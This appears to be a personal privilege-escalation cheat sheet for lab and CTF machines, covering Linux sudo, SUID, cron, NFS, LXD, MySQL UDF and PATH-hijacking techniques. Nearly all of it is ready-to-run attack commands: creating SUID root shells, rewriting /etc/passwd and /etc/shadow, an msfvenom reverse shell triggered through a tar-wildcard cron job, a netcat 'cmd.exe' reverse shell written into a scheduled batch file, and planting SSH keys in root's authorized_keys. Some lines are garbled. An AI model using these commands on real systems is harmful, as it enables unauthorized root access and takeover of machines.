#MUST CHECK
Sudo
SUID
Windows Token Privileges

#Service Exploits && MYSQL
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
mysql -u root
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
exit
/tmp/rootbash -p
#Weak File Permissions - Writable /etc/shadow
mkpasswd -m sha-512 newpasswordhere
#Weak File Permissions - Writable /etc/passwd
openssl passwd newpasswordhere
Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x").
Switch to the root user, using the new password
#Sudo - Environment Variables
LD_PRELOAD and LD_LIBRARY_PATH are both inherited from the user's environment. LD_PRELOAD loads a shared object before any others when a program is run. LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first.

gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
sudo LD_PRELOAD=/tmp/preload.so program-name-here

ldd /usr/sbin/apache2
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp apache2

#Cron Jobs - File Permissions
cat /etc/crontab
locate overwrite.sh
ls -l /usr/local/bin/overwrite.sh

#Cron Jobs - PATH Environment Variable

Create a file called overwrite.sh in your home directory with the following contents:

#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash

chmod +x /home/user/overwrite.sh
/tmp/rootbash -p

#Cron Jobs - Wildcards
cat /usr/local/bin/compress.sh
output: tar czf /tmp/backup.tar.gz *
Take a look at the GTFOBins page for tar.
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
chmod +x /home/user/shell.elf
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
When the tar command in the cron job runs, the wildcard (*) will expand to include these files.

#SUID / SGID Executables - Known Exploits
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
Note that /usr/sbin/exim-4.84-3 appears in the results.
/home/user/tools/suid/exim/cve-2016-1531.sh

#SUID / SGID Executables - Shared Object Injection
The /usr/local/bin/suid-so SUID executable is vulnerable to shared object injection.
/usr/local/bin/suid-so
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
Note that the executable tries to load the /home/user/.config/libcalc.so shared object within our home directory, but it cannot be found.
mkdir /home/user/.config
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
/usr/local/bin/suid-so

#SUID / SGID Executables - Environment Variables
The /usr/local/bin/suid-env executable can be exploited due to it inheriting the user's PATH environment variable and attempting to execute programs without specifying an absolute path.
/usr/local/bin/suid-env
strings /usr/local/bin/suid-env
One line ("service apache2 start") suggests that the service executable is being called to start the webserver, however the full path of the executable (/usr/sbin/service) is not being used.
gcc -o service /home/user/tools/suid/service.c
PATH=.:$PATH /usr/local/bin/suid-env

#SUID / SGID Executables - Abusing Shell Features (#1)
The /usr/local/bin/suid-env2 executable is identical to /usr/local/bin/suid-env except that it uses the absolute path of the service executable (/usr/sbin/service) to start the apache2 webserver.
strings /usr/local/bin/suid-env2
In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.
/bin/bash --version
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
/usr/local/bin/suid-env2

#SUID / SGID Executables - Abusing Shell Features (#2)
Note: This will not work on Bash versions 4.4 and above.
When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements.
Run the /usr/local/bin/suid-env2 executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:

env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
/tmp/rootbash -p

#NFS
Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.
Check the NFS share configuration on the System:
cat /etc/exports

Using Kali's root user, create a mount point on your Kali box and mount the /tmp share (update the IP accordingly):
mkdir /tmp/nfs
mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs
Still using Kali's root user, generate a payload using msfvenom and save it to the mounted share (this payload simply calls /bin/bash):
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
Still using Kali's root user, make the file executable and set the SUID permission:
chmod +xs /tmp/nfs/shell.elf
Back on the System, as the low privileged user account, execute the file to gain a root shell:
/tmp/shell.elf

#Kernel Exploits 
Kernel exploits can leave the system in an unstable state, which is why you should only run them as a last resort.
Run the Linux Exploit Suggester 2 tool to identify potential kernel exploits on the current system:
perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
#MSFconsole
irb
system("/bin/bash")
#VIM
-c ':!/bin/sh' /dev/null
OR
vi
:set shell=/bin/sh
:shell
#exe file in bat file
type job.bat
icacls job.bat
echo C:\Log-Management\nc64.exe -e cmd.exe {your_IP} {port} > C:\Log-Management\job.bat
#LXD
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
lxc image import ./alpine-v3.14-x86_64-20210809_0302.tar.gz

F. I forgot to add the alias. Nvm, run this command:
lxc image list
Here, we see its fingerprint. Delete this image using:
lxc image delete fdf378551f70

Now back to the task:
lxc image import ./alpine-v3.14-x86_64-20210809_0302.tar.gz --alias myimagelxc init myimage ignite -c security.privileged=true

If error:
lxd init

Last commands:
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
cd /mnt/root
 
#X11

cat /mnt/2/.Xauthority | base64
echo AQAADHN<...SNIP...>S0xAoNm/oZZ4/ | base64 -d > /tmp/.Xauthority
export XAUTHORITY=/tmp/.Xauthority
w
man xwd
xwd -root -screen -silent -display :0 > /tmp/screen.xwd
convert screen.xwd screen.png

#journalctrl

resize youre terminal to very small 
type: !/bin/bash

#initctl

get the folder where the files are generating 
(for me /etc/init/test.conf)
edit the file:

script
chmod u+s /bin/bash
end script
#Software
dpkg -l
cat /etc/lsb-release
uname -r
#ALL
sudo su -
#Another user
sudo -u user /bin/vuln
#SSH file replacement 
ssh-keygen -f kei
echo "key.pub" >> /root/.ssh/authorized_keys
ssh root@10.10.10.10 -i key
#File Transfer
scp linenum.sh user@remotehost:/tmp/linenum.sh

s1l3ntmask@remote$ base64 file.txt -w 0
s1l3ntmask@local$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > file.txt

CHECK:
s1l3ntmask@local$ md5sum shell

321de1d7e7c3735838890a72c9ae7d1d shell

s1l3ntmask@remote$ md5sum shell

321de1d7e7c3735838890a72c9ae7d1d shell
#PERM 
find / -perm -u -c 'import pty;pty.spawn("/bin/bash")'=s -type f 2>/dev/null
find / -type f  -perm -u=katie  2> /dev/null
find / -perm -4000 2>/dev/null
find / -perm -g=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -perm -777 2>/dev/null
#Java
If you hacked yourself in a system with java try to find a password in the files
#List nginx confing file
domain name is soccer.htb
ls -la /etc/nginx/sites-enabled/
found: soc-player.htb
soc-player.htb is a subdomain
echo "10.10.11.194 soc-player.soccer.htb" | sudo tee -a /etc/hosts
#Log
grep -R -e 'password' /var/log/

#Path Hijaking
This exploit works only whan a binary file is running root

cd /tmp
nano tail

tail:
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +us /tmp/rootbash

export PATH=/tmp:$PATH
chmod +x tail

run your binary file 

